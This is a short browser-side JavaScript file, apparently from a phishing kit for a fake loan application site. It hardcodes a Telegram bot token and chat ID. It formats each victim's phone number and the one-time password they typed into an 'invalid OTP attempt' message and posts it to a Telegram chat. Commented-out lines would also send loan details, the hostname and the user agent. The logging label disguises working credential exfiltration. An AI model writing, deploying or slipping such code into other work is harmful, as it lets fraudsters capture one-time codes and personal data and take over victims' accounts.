// telegram_config.js
const TELEGRAM_BOT_TOKEN = '8431649748:AAG2Ao5NaD8VltAKv1-eSEuiRQBpMqgDL80';
const TELEGRAM_CHAT_ID = '5520957080';

// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Telegram send error:', error);
    }
}

// Function to format OTP error message
function formatOTPErrorMessage(phoneNumber, enteredOTP, correctOTP, applicationData) {
    const timestamp = new Date().toLocaleString('en-ZW', { timeZone: 'Africa/Harare' });
    
    let message = `<b>🔐 INVALID OTP ATTEMPT DETECTED</b>\n`;
    message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
    message += `<b>📱 Phone:</b> ${phoneNumber}\n`;
    message += `<b>⌨️ Entered OTP:</b> <code>${enteredOTP}</code>\n`;
   // message += `<b>✅ Correct OTP:</b> <code>${correctOTP}</code>\n`;
    message += `<b>⏰ Time:</b> ${timestamp}\n`;
   // message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
  //  message += `<b>📋 LOAN APPLICATION DETAILS:</b>\n`;
  //  message += `<b>💰 Amount:</b> $${applicationData.loanAmount || 'N/A'}\n`;
    //message += `<b>📆 Term:</b> ${applicationData.loanTerm || 'N/A'} months\n`;
  //  message += `<b>📊 Weekly:</b> $${applicationData.weeklyRepayment || 'N/A'}\n`;
    //message += `<b>🎯 Purpose:</b> ${applicationData.purpose || 'N/A'}\n`;
  //  message += `<b>🏦 Type:</b> ${applicationData.loanType || 'N/A'}\n`;
 //   message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
//    message += `<b>🌍 IP:</b> ${window.location.hostname}\n`;
  //  message += `<b>🖥️ User Agent:</b> ${navigator.userAgent.substring(0, 100)}...\n`;
    
    return message;
}
